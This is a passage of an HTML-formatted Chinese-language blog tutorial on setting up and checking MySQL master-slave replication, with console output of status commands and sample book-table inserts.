sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;&#x4ECE;&#x5E93;&#x67E5;&#x770B;&#x6570;&#x636E;&#x662F;&#x5426;&#x540C;&#x6B65;&#x8FC7;&#x6765;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> BOOK.book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;&#x4E3B;&#x5E93;&#x72B6;&#x6001;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                        |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">| mysql-bin.000002 |     1620 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;&#x4ECE;&#x5E93;&#x72B6;&#x6001;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                        |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">| mysql-bin.000002 |     1584 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x4ECE;&#x5E93;&#x505C;&#x6389;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; stop slave;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: </span><br><span class="line">                  Master_Host: 192.168.10.11</span><br><span class="line">                  Master_User: Jaking</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000002</span><br><span class="line">          Read_Master_Log_Pos: 1620</span><br><span class="line">               Relay_Log_File: server12-relay-bin.000002</span><br><span class="line">                Relay_Log_Pos: 1833</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000002</span><br><span class="line">             Slave_IO_Running: No</span><br><span class="line">            Slave_SQL_Running: No</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: </span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 1620</span><br><span class="line">              Relay_Log_Space: 2043</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: NULL</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 11</span><br><span class="line">                  Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6</span><br><span class="line">             Master_Info_File: /var/lib/mysql/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: </span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6</span><br><span class="line">            Executed_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6</span><br><span class="line">                Auto_Position: 1</span><br><span class="line">         Replicate_Rewrite_DB: </span><br><span class="line">                 Channel_Name: </span><br><span class="line">           Master_TLS_Version: </span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;&#x4E3B;&#x5E93;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x540E;&#x4ECE;&#x5E93;&#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x67E5;&#x770B;&#x662F;&#x5426;&#x540C;&#x6B65;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="string">`testbookdb`</span> <span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="keyword">use</span> testbookdb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> book1 (bTypeId <span class="built_in">int</span>,bName <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,publishing <span class="built_in">char</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;1&apos;</span>,<span class="string">&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;</span>,<span class="string">&apos;66&apos;</span>,<span class="string">&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;2&apos;</span>,<span class="string">&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;</span>,<span class="string">&apos;68&apos;</span>,<span class="string">&apos;&#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;3&apos;</span>,<span class="string">&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;</span>,<span class="string">&apos;90&apos;</span>,<span class="string">&apos;&#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;4&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;</span>,<span class="string">&apos;71&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;5&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;&apos;</span>,<span class="string">&apos;72&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;6&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;&apos;</span>,<span class="string">&apos;73&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;7&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;&apos;</span>,<span class="string">&apos;74&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;8&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;&apos;</span>,<span class="string">&apos;75&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;9&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;&apos;</span>,<span class="string">&apos;76&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;10&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;&apos;</span>,<span class="string">&apos;77&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;11&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;&apos;</span>,<span class="string">&apos;78&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;12&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;&apos;</span>,<span class="string">&apos;79&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> book2 (<span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,pages <span class="built_in">int</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;</span>,<span class="string">&apos;30&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;</span>,<span class="string">&apos;60&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;</span>,<span class="string">&apos;80&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;</span>,<span class="string">&apos;166&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> book1;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> book2;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from book1;</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">| bTypeId | bName                             | price | publishing            |</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |    71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;                  |    72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;                  |    73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;                  |    74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;                  |    75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;                  |    76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;                  |    77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;                  |    78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;                  |    79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book2;</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">| name                              | price | pages |</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    30 |   666 |</span><br><span class="line">| &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    60 |   666 |</span><br><span class="line">| &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    80 |   666 |</span><br><span class="line">| &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |   166 |   666 |</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;&#x4E3B;&#x5E93;&#x72B6;&#x6001;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------------------------------+</span></span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                         |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------------------------------+</span></span><br><span class="line">| mysql-bin.000002 |     7389 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;&#x4ECE;&#x5E93;&#x72B6;&#x6001;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                        |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">| mysql-bin.000002 |     1584 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x4ECE;&#x5E93;&#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x67E5;&#x770B;&#x662F;&#x5426;&#x540C;&#x6B65;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; start slave;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 192.168.10.11</span><br><span class="line">                  Master_User: Jaking</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000002</span><br><span class="line">          Read_Master_Log_Pos: 7389</span><br><span class="line">               Relay_Log_File: server12-relay-bin.000003</span><br><span class="line">                Relay_Log_Pos: 6223</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000002</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: </span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 7389</span><br><span class="line">              Relay_Log_Space: 8112</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span 